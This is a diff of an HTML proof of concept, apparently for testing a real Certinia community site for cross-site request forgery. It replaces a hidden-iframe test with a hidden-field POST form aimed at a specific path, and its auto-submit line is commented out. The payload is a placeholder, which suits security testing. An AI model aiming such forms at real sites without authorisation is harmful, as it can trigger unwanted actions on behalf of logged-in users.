@@ -1,24 +1,16 @@
 <!DOCTYPE html>
 <html>
-<head>
-  <title>CSRF Test via iframe</title>
-</head>
-<body>
-  <h1>Testing CSRF on Certinia</h1>
+  <body>
+    <h2>PoC: CSRF Attack</h2>
 
-  <!-- iframe مخفي -->
-  <iframe src="https://certinia.my.site.com/community/YourTargetPage" style="display:none;" id="targetFrame"></iframe>
+    <form action="https://certinia.my.site.com/community/static/111213/js/perf/repeat/2/" method="POST" id="csrf-form">
+      <input type="hidden" name="test" value="csrf-test-value" />
+      <input type="submit" value="Click here to trigger CSRF">
+    </form>
 
-  <script>
-    // تسجيل وقت التحميل للتأكد من التنفيذ
-    window.onload = function() {
-      console.log("[+] iframe loaded. Waiting for internal JS to trigger request...");
-
-      // اختبار إذا حدث شيء بعد التأطير
-      setTimeout(() => {
-        console.log("[!] No auto POST request detected yet. Manual observation via DevTools (Network tab) may be required.");
-      }, 3000);
-    };
-  </script>
-</body>
+    <script>
+      // الإرسال التلقائي:
+      // document.getElementById("csrf-form").submit();
+    </script>
+  </body>
 </html>
